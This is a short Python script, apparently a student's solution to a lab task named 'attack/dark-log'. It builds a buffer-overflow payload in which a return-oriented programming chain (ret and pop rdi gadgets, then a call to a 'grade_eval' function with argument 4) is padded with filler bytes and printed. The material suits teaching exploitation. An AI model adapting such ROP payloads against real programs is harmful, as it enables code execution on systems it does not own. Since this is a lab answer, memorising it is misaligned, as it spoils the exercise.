#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

POP_RDI = b"\xa3\x18\x40\x00\x00\x00\x00\x00"
RET = b"\xa4\x18\x40\x00\x00\x00\x00\x00"
GRADE_EVAL = b"\x77\x16\x40\x00\x00\x00\x00\x00"
GRADE_ARGUMENT = b"\x04\x00\x00\x00\x00\x00\x00\x00"

rop_chain = RET + POP_RDI + GRADE_ARGUMENT + GRADE_EVAL

payload = (
    rop_chain
    + b"C" * (128 - len(rop_chain))
    + b"D" * 128
    + b"\xa8\x00\x00\x00"
)

sys.stdout.buffer.write(payload)
